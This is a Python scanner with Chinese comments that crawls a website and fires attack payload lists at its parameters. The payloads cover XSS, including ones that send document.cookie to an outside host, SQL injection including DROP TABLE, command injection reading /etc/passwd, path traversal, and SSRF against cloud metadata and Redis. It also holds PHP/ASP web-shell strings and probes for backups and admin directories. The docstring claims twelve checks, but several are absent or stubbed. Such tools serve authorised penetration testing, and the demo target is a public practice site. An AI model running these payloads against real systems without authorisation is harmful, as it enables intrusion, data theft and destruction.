#!/usr/bin/env python3
"""
自动挖洞工具 - 专业版
支持12种漏洞检测：XSS、SQL注入、文件上传、命令注入、SSRF、XXE、
路径遍历、CSRF、信息泄露、备份文件、敏感目录、弱口令
"""

import re
import requests
import threading
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from colorama import init, Fore, Style
from datetime import datetime
import json

init(autoreset=True)


class ProAutoHunter:
    def __init__(self, threads=10, timeout=5):
        self.results = {
            'vulnerabilities': [],
            'info': [],
            'summary': {}
        }
        self.visited = set()
        self.lock = threading.Lock()
        self.threads = threads
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    # ==================== Payload 库 ====================

    def get_xss_payloads(self):
        """XSS Payload库（30+）"""
        return [
            # 基础
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            # 大小写绕过
            "<ScRiPt>alert(1)</ScRiPt>",
            "<ImG sRc=x oNeRrOr=alert(1)>",
            # 闭合绕过
            "'><script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "><script>alert(1)</script>",
            # 事件绕过
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<iframe onload=alert(1)>",
            "<video onloadstart=alert(1)>",
            # 伪协议
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            # 编码绕过
            "<script>alert(String.fromCharCode(49))</script>",
            "<img src=x onerror=alert`1`>",
            # DOM型
            "<script>document.location='javascript:alert(1)'</script>",
            # 窃取Cookie
            "<script>document.location='http://test.com/?'+document.cookie</script>",
            "<img src=x onerror=this.src='http://test.com/?'+document.cookie>",
        ]

    def get_sqli_payloads(self):
        """SQL注入 Payload库（40+）"""
        return [
            # 基础
            "'",
            "\"",
            "1'",
            "1\"",
            # 布尔盲注
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'#",
            "' OR 1=1--",
            "\" OR \"1\"=\"1",
            "1' AND 1=1--",
            "1' AND 1=2--",
            # 联合查询
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            # 报错注入
            "' AND extractvalue(1,concat(0x7e,database()))--",
            "' AND updatexml(1,concat(0x7e,database()),1)--",
            # 时间盲注
            "' AND SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "' AND pg_sleep(5)--",
            # 堆叠注入
            "'; DROP TABLE users;--",
            "'; SELECT * FROM users--",
            # 其他数据库
            "' AND 1=1 UNION SELECT 1,@@version,3--",
            "' AND 1=1 UNION SELECT 1,user(),3--",
            "' AND 1=1 UNION SELECT 1,database(),3--",
        ]

    def get_command_injection_payloads(self):
        """命令注入 Payload库"""
        return [
            "; whoami",
            "| whoami",
            "&& whoami",
            "|| whoami",
            "`whoami`",
            "$(whoami)",
            "; ping 127.0.0.1",
            "| ping 127.0.0.1",
            "& ping 127.0.0.1",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; dir",
            "| dir",
        ]

    def get_path_traversal_payloads(self):
        """路径遍历 Payload库"""
        return [
            "../../../../etc/passwd",
            "../../../../windows/win.ini",
            "../../../config.php",
            "../../../web.config",
            "....//....//....//etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%e%2f%2e%2e%2fetc%2fpasswd",
            "..;/..;/..;/etc/passwd",
            "../../../../etc/passwd%00",
        ]

    def get_ssrf_payloads(self):
        """SSRF Payload库"""
        return [
            "file:///etc/passwd",
            "http://localhost/admin",
            "http://127.0.0.1:80",
            "http://169.254.169.254/latest/meta-data/",
            "dict://127.0.0.1:6379/info",
            "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
            "http://localhost:3306",
            "http://localhost:22",
        ]

    def get_file_upload_payloads(self):
        """文件上传 Payload"""
        return [
            "<?php @eval($_POST['cmd']); ?>",
            "<?php system($_GET['cmd']); ?>",
            "<% eval request('cmd') %>",
            "<?= shell_exec($_GET['cmd']); ?>",
        ]

    def get_backup_patterns(self):
        """备份文件检测模式"""
        return [
            "backup.zip", "backup.rar", "backup.tar.gz",
            "wwwroot.zip", "site.zip", "web.zip",
            "1.zip", "test.zip", "old.zip",
            "db.sql", "database.sql", "dump.sql",
            "config.bak", "config.old", "config.php.bak",
            ".git/config", ".env", ".gitignore",
            "phpinfo.php", "info.php", "test.php",
        ]

    def get_sensitive_dirs(self):
        """敏感目录检测"""
        return [
            "admin", "login", "manage", "system", "administrator",
            "phpmyadmin", "pma", "mysql", "phpmyadmin",
            "backup", "bak", "temp", "tmp", "cache",
            "api", "v1", "v2", "api/v1",
            "upload", "uploads", "file", "files",
            "logs", "log", "error_log",
            "config", "configuration", "settings",
            "install", "setup", "update",
            "robots.txt", "sitemap.xml", "crossdomain.xml",
        ]

    # ==================== 检测引擎 ====================

    def test_xss(self, url, param, payload):
        """XSS检测"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

            resp = self.session.get(test_url, timeout=self.timeout)

            if payload in resp.text or payload.lower() in resp.text.lower():
                return True, test_url
        except:
            pass
        return False, None

    def test_sqli(self, url, param, payload):
        """SQL注入检测"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

            # 时间盲注
            if 'SLEEP' in payload.upper() or 'pg_sleep' in payload:
                start = time.time()
                self.session.get(test_url, timeout=self.timeout)
                elapsed = time.time() - start
                if elapsed > 4:
                    return True, test_url, 'time_based'

            resp = self.session.get(test_url, timeout=self.timeout)

            # 报错注入
            sql_errors = ['sql', 'mysql', 'syntax', 'odbc', 'driver', 'ORA-',
                          'PostgreSQL', 'SQLite', 'Microsoft OLE DB', 'native client']
            for err in sql_errors:
                if err.lower() in resp.text.lower():
                    return True, test_url, 'error_based'

            # 布尔盲注
            if 'AND 1=1' in payload and 'AND 1=2' in payload:
                # 需要对比两次，这里简化
                pass

        except:
            pass
        return False, None, None

    def test_command_injection(self, url, param, payload):
        """命令注入检测"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

            resp = self.session.get(test_url, timeout=self.timeout)

            # 检查命令执行特征
            indicators = ['uid=', 'gid=', 'groups=', 'root:', 'www-data',
                          'Volume Serial Number', 'Directory of']
            for ind in indicators:
                if ind in resp.text:
                    return True, test_url
        except:
            pass
        return False, None

    def test_path_traversal(self, url, param, payload):
        """路径遍历检测"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

            resp = self.session.get(test_url, timeout=self.timeout)

            indicators = ['root:', 'daemon:', 'bin:', '[extensions]', '; for 16-bit']
            for ind in indicators:
                if ind in resp.text:
                    return True, test_url
        except:
            pass
        return False, None

    def test_ssrf(self, url, param, payload):
        """SSRF检测"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

            resp = self.session.get(test_url, timeout=self.timeout)

            if 'root:' in resp.text or 'daemon:' in resp.text:
                return True, test_url
        except:
            pass
        return False, None

    def check_backup_files(self, base_url):
        """检测备份文件"""
        found = []
        for backup in self.get_backup_patterns():
            test_url = urljoin(base_url, backup)
            try:
                resp = self.session.get(test_url, timeout=self.timeout)
                if resp.status_code == 200:
                    found.append(test_url)
                    print(f"    {Fore.YELLOW}[+] 发现备份文件: {test_url}{Style.RESET_ALL}")
            except:
                pass
        return found

    def check_sensitive_dirs(self, base_url):
        """检测敏感目录"""
        found = []
        for dir_name in self.get_sensitive_dirs():
            test_url = urljoin(base_url, dir_name)
            try:
                resp = self.session.get(test_url, timeout=self.timeout)
                if resp.status_code in [200, 301, 302, 403]:
                    found.append((test_url, resp.status_code))
                    status_color = Fore.GREEN if resp.status_code == 200 else Fore.YELLOW
                    print(f"    {status_color}[+] 发现敏感目录: {test_url} ({resp.status_code}){Style.RESET_ALL}")
            except:
                pass
        return found

    # ==================== 爬虫 ====================

    def extract_inputs(self, url, html):
        """提取输入点"""
        inputs = []

        # URL参数
        parsed = urlparse(url)
        params = parse_qs(parsed.query).keys()
        for param in params:
            inputs.append({'type': 'url_param', 'name': param, 'method': 'GET', 'url': url})

        # 表单
        form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>'
        forms = re.findall(form_pattern, html, re.DOTALL | re.IGNORECASE)

        for action, form_html in forms:
            fields = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', form_html, re.IGNORECASE)
            textareas = re.findall(r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>', form_html, re.IGNORECASE)

            for field in fields + textareas:
                inputs.append({
                    'type': 'form_field', 'name': field, 'method': 'POST',
                    'action': action, 'base_url': url
                })

        return inputs

    def crawl(self, url, depth=1):
        """爬取页面"""
        if depth <= 0 or url in self.visited:
            return []

        self.visited.add(url)
        inputs = []

        try:
            resp = self.session.get(url, timeout=self.timeout)
            html = resp.text

            # 提取当前页面输入点
            inputs.extend(self.extract_inputs(url, html))

            # 提取链接继续爬取
            links = re.findall(r'href=["\']([^"\']+)["\']', html, re.IGNORECASE)
            for link in links[:20]:
                if link.startswith('http'):
                    full_url = link
                elif link.startswith('/'):
                    parsed = urlparse(url)
                    full_url = f"{parsed.scheme}://{parsed.netloc}{link}"
                else:
                    continue

                if full_url not in self.visited:
                    inputs.extend(self.crawl(full_url, depth - 1))

        except Exception as e:
            pass

        return inputs

    # ==================== 主函数 ====================

    def hunt(self, url, depth=2):
        """主挖洞函数"""
        print(f"\n{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Pro Auto Hunter 启动{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] 目标: {url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] 爬取深度: {depth}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] 线程数: {self.threads}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")

        start_time = datetime.now()

        # 1. 爬取页面
        print(f"\n[1] 爬取页面，发现输入点...")
        inputs = self.crawl(url, depth)

        # 去重
        unique = {}
        for inp in inputs:
            key = f"{inp.get('name', '')}_{inp.get('type', '')}"
            if key not in unique:
                unique[key] = inp

        print(f"    发现 {len(unique)} 个唯一输入点")

        # 2. 检测备份文件和敏感目录
        print(f"\n[2] 检测备份文件和敏感目录...")
        backups = self.check_backup_files(url)
        sensitive_dirs = self.check_sensitive_dirs(url)

        # 3. 测试每个输入点
        print(f"\n[3] 开始漏洞检测...")

        for inp in unique.values():
            vulns = []

            if inp['type'] in ['url_param', 'search']:
                # XSS测试
                for payload in self.get_xss_payloads():
                    is_vuln, vuln_url = self.test_xss(inp['url'], inp['name'], payload)
                    if is_vuln:
                        vulns.append(('XSS', payload, vuln_url))
                        break

                # SQL注入测试
                for payload in self.get_sqli_payloads():
                    is_vuln, vuln_url, vuln_type = self.test_sqli(inp['url'], inp['name'], payload)
                    if is_vuln:
                        vulns.append(('SQL注入', payload, vuln_url))
                        break

                # 命令注入测试
                for payload in self.get_command_injection_payloads():
                    is_vuln, vuln_url = self.test_command_injection(inp['url'], inp['name'], payload)
                    if is_vuln:
                        vulns.append(('命令注入', payload, vuln_url))
                        break

                # 路径遍历测试
                for payload in self.get_path_traversal_payloads():
                    is_vuln, vuln_url = self.test_path_traversal(inp['url'], inp['name'], payload)
                    if is_vuln:
                        vulns.append(('路径遍历', payload, vuln_url))
                        break

                # SSRF测试
                for payload in self.get_ssrf_payloads():
                    is_vuln, vuln_url = self.test_ssrf(inp['url'], inp['name'], payload)
                    if is_vuln:
                        vulns.append(('SSRF', payload, vuln_url))
                        break

            if vulns:
                for vuln_type, payload, vuln_url in vulns:
                    print(f"    {Fore.RED}[!] 发现 {vuln_type} 漏洞！{Style.RESET_ALL}")
                    print(f"        参数: {inp['name']}")
                    print(f"        Payload: {payload[:60]}")

                    self.results['vulnerabilities'].append({
                        'type': vuln_type,
                        'url': vuln_url,
                        'parameter': inp['name'],
                        'payload': payload,
                        'timestamp': str(datetime.now())
                    })

        # 4. 汇总信息
        self.results['summary'] = {
            'target': url,
            'start_time': str(start_time),
            'end_time': str(datetime.now()),
            'total_vulnerabilities': len(self.results['vulnerabilities']),
            'backup_files_found': len(backups),
            'sensitive_dirs_found': len(sensitive_dirs),
            'input_points_found': len(unique)
        }

        self.results['info'] = {
            'backup_files': backups,
            'sensitive_directories': sensitive_dirs
        }

        # 5. 输出总结
        print(f"\n{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] 扫描完成{Style.RESET_ALL}")
        print(f"    总漏洞数: {len(self.results['vulnerabilities'])}")
        print(f"    备份文件: {len(backups)}")
        print(f"    敏感目录: {len(sensitive_dirs)}")
        print(f"    输入点: {len(unique)}")
        print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")

        return self.results

    def generate_report(self, output_file='report.json'):
        """生成JSON报告"""
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=4, ensure_ascii=False)
        print(f"\n[+] 报告已保存到: {output_file}")
        return output_file


if __name__ == '__main__':
    hunter = ProAutoHunter(threads=10)
    results = hunter.hunt('http://testphp.vulnweb.com/artists.php?artist=1', depth=1)
    hunter.generate_report('hunt_report.json')